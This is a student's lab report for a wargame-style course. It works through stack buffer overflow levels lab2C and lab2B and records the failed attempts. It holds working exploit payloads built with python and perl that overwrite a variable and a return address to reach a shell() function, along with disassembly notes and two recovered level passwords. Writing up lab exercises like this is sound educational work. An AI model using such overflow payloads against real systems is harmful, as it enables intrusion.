@@ -1,0 +1,293 @@
+Carter Gunderson
+7 lab report
+
+Ok getting the VM running
+and getting into lab2C
+and making a working directory in /tmp
+and getting the c files in there.
+
+and now I'm looking at the source code for
+lab2C.c
+
+it looks like we want to get it to
+call the shell() function by using
+a buffer overflow
+
+so the program takes an argument
+and puts it in a buffer that needs
+to == 0xdeadbeef
+
+so using the notes from today about
+using something like ./lab2C 
+
+echo -e '\x64\x65\x61\x64\x62\x65\x65\x66' will print deadbeef
+
+also
+
+pyhon -c 'print "\x64\x65\x61\x64\x62\x65\x65\x66"'
+
+I was missing the ' before print which was messing me up
+
+which is the password so I have to get through the 15 char array
+and then print deadbeef in hex? Or does it have to include the '0x' before
+the letters deadbeef. I guess ill try both
+
+
+oh man I've been bamboozled! its not trying to get deadbeef in
+ascii its d as in 13 e as in 14 a as in 10 its the actual hex
+numbers!! gahh
+
+ok I should be able to get it now
+echo $((16#deadbeef)) = 3735928559
+
+ok but its not working at all like I thought it would
+so when I put up to 15 characters setme is 0 but then once
+I put in a 16th character, I would think that would be the one that
+shows up in setme but some completely different number shows up
+and I can't explain why
+
+oh is it because it reads the string backwards or something
+no its not even backwards numbers its just totally different
+numbers
+
+lab2C@warzone:/tmp/sandbox$ ./lab2C 123456789012345
+Not authenticated.
+set_me was 0
+
+lab2C@warzone:/tmp/sandbox$ ./lab2C 1234567890123456
+Not authenticated.
+set_me was 54
+
+lab2C@warzone:/tmp/sandbox$ ./lab2C 12345678901234567
+Not authenticated.
+set_me was 14134
+
+ok I think I understand whats happening is its turning
+the input values into ascii codes and representing them
+as decimal values so d becomes 100. Now I need to figure
+out how to get the ascii values for
+
+3735928559
+
+37 = %
+35 = #
+92 = \
+85 = U
+59 = ;
+
+so maybe if I do %#\U; it will interpret it as 3735928559
+
+no that didnt work
+% by itself comes up as 37 
+
+ok that was all wrong here's what finally got it and how I did it
+./lab2C `python -c 'print "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x50\x51\x52\x53\x54\x55\xef\xbe\xad\xde\x50\84\x04\08"'`
+
+
+the way I got those values was got help making a program in c
+that worked like this
+
+#include <stdio.h>
+
+int main()
+{
+    int deadbeef = 0xdeadbeef;
+
+
+    printf("%s", (char *)&deadbeef);
+
+    return 0;
+}
+
+and then piped the output of that to xxd
+and it showed 
+0000000: efbe adde 5084 0408
+
+and then in /home/lab2B/.pass the password to the next level:
+1m_all_ab0ut_d4t_b33f
+
+this way of making a program to print out what I was interested in
+was the key much easier than using gdb
+
+I see, so I actually only needed 
+efbe adde because thats the bytes of deadbeef
+backwards because of the little endian architecture
+it reads the least signigicant bit first
+and I didnt need the 5084 0408 that was some
+garbage because there was no null byte
+I could avoid that by declaring an int n = 0;
+before int deadbeef so that there would be
+something else in memory to stop it
+
+
+ok on to the next level lab2B
+
+so lab2B.c has a function shell()
+but it never gets called anywhere in the code
+which makes me think there must be some way to inject
+new source code using the overflow
+
+ok it looks like this is similar to the example from
+the booksrc called auth_overflow2.c
+
+so I opened lab2B in r2 and I can see that the 
+shell() function is at address 0x080486bd
+
+it looks like erickson is saying that if the overflow
+in one funciton goes to the point where it overflows
+into the return adderss, then it is possible to inject a
+new return address in the overflow instead
+
+so the return address gets pushed on to the stack
+as part of the function call.
+then the old base pointer gets put on the stack
+and then the current stack pointer location is saved
+as the new base pointer location
+so the goal is to overwrite the return address
+so if I can overflow over the new base pointer
+and the old base pointer to overwrite the return address
+to be the address of the shell function I should
+be able to trick the program into calling the shell
+function and completing the challenge
+
+
+shell is at 0x080486bd
+
+so if I put that address in enough times as the input
+it should overwrite the return adress and jump to shell
+when it thinks its jumping to the next instruction
+after print_name
+
+but because of little endian it has to be backwards so
+itll be \xbd\x86\x04\x08
+
+and I can just repeat that a bunch of times as necessary
+to get to the right overflow ammount 
+
+ok that didnt work lets see if I can read the print name
+function
+
+Dump of assembler code for function print_name:
+   0x080486d0 <+0>:	push   ebp
+   0x080486d1 <+1>:	mov    ebp,esp
+   0x080486d3 <+3>:	sub    esp,0x28
+
+this is the prologue just preserving the old ebp
+starting the new ebp at the current stack location
+and then allocating 0x28 bits of space
+
+   0x080486d6 <+6>:	mov    eax,DWORD PTR [ebp+0x8]
+
+eax is getting the de-referenced value at ebp+0x8
+which is the arguement passed from main which is
+the command line argument 
+
+   0x080486d9 <+9>:	mov    DWORD PTR [esp+0x4],eax
+
+
+   0x080486dd <+13>:	lea    eax,[ebp-0x17]
+
+then here the address of whatever is 0x17 above
+the stack is loaded into eax
+
+   0x080486e0 <+16>:	mov    DWORD PTR [esp],eax
+
+and then that is mved to be the stack pointer
+
+   0x080486e3 <+19>:	call   0x8048580 <strcpy@plt>
+   0x080486e8 <+24>:	lea    eax,[ebp-0x17]
+   0x080486eb <+27>:	mov    DWORD PTR [esp+0x4],eax
+   0x080486ef <+31>:	mov    DWORD PTR [esp],0x80487d8
+   0x080486f6 <+38>:	call   0x8048570 <printf@plt>
+   0x080486fb <+43>:	leave
+   0x080486fc <+44>:	ret
+
+
+ok I found something
+ if I do ./lab2B aaaaaaaaaaaaaaaaaaaaaaaaaaa$(perl -e 'print "\xbd\x86\x04\x08"')
+
+it says 
+Hello aaaaaaaaaaaaaaaaaaaaaaaaaaa��
+sh: 1: 4: not found
+Segmentation fault (core dumped)
+
+which sh is the command that exec_string is doing so
+maybe its working? I'll try it on the real one, not the
+sandbox one to see if that helps
+
+hmm no it still has the same thing, but only for that
+exact number of a's I wonder what it means
+
+well if I recreate the program but instead of a function
+that calls shell its a fucntion that just prints
+"you did it!" nothing happens at that
+
+so maybe that sh: 1: 4: not found isnt the thing
+
+ok I even tried using a bash script to try all
+ammounts of "a" from 1 to 100 and only that one
+ammount of a's did anything interesting
+which was output at the same ammount above 
+sh: 1: 4: not found
+
+ok so this way if I switch up the letters I can see more
+of whats going where and count by 4's easier
+
+AAAABBBBCCCCDDDDEEEEFFFGGGG$(perl -e 'print "\xbd\x86\x04\x08"')
+
+but it turns out, getting to the shell function isn't enough, it needs
+arguments, it then passes those arguments to system
+
+so this prints /bin//sh 
+$(perl -e 'print "\x2f\x62\x69\x6e\x2f\x2f\x73\x68"')
+
+
+./lab2B AAAABBBBCCCCDDDDEEEEFFFGGGG$(perl -e 'print "\xbd\x86\x04\x08"')ZZZZ$(perl -e 'print "\x2f\x62\x69\x6e\x2f\x2f\x73\x68"')
+
+doesn't work, realizing that the function needs a pointer as an argument
+
+(vmmap to see the memory map
+shows ranges of sections of memory)
+
+actually there is a pointer to the string
+already in the source code, so that must be the 
+way to get it
+
+how to pass a pointer on the stack?
+exec_string
+address x0804a028
+
+little-endian
+/x28/a0/04/08
+
+
+this one??
+AAAABBBBCCCCDDDDEEEEFFFGGGG$(perl -e 'print "\xbd\x86\x04\x08"    ')ZZZZ$(perl -e 'print "\x28\xa0\x04\x08"')
+
+that should be working, it from low to high so it should pass over the higher addressed  parts of the stack (towards the bottom), so it needs to pass
+over the base pointer and get over the base pointer to be where the
+argument is going to be expected to be, so thats what the ZZZZ is for
+
+./lab2B AAAABBBBCCCCDDDDEEEEFFFGGGG$(perl -e 'print "\xbd\x86\x04\x08"')ZZZZ$(perl -e 'print "\x28\xa0\x04\x08"')
+
+its still not working
+we got richard and dee working
+on it and eventually
+realized that the address the objdump
+gave for exec_string was actually
+a pointer to a pointer and we really
+needed the first degree pointer,
+two degrees of pointer was too much
+and then we finally got it
+
+(gdb) attach --waitfor <process-name>
+
+
+./lab2B AAAABBBBCCCCDDDDEEEEFFFFGGG$(perl -e 'print "\xbd\x86\x04\x08"')ZZZZ$(perl -e 'print "\xd0\x87\x04\x08"')
+
+so the actual address is 0x80487d0
+
+and the password for lab2A is 
+i_c4ll_wh4t_i_w4nt_n00b
+
+
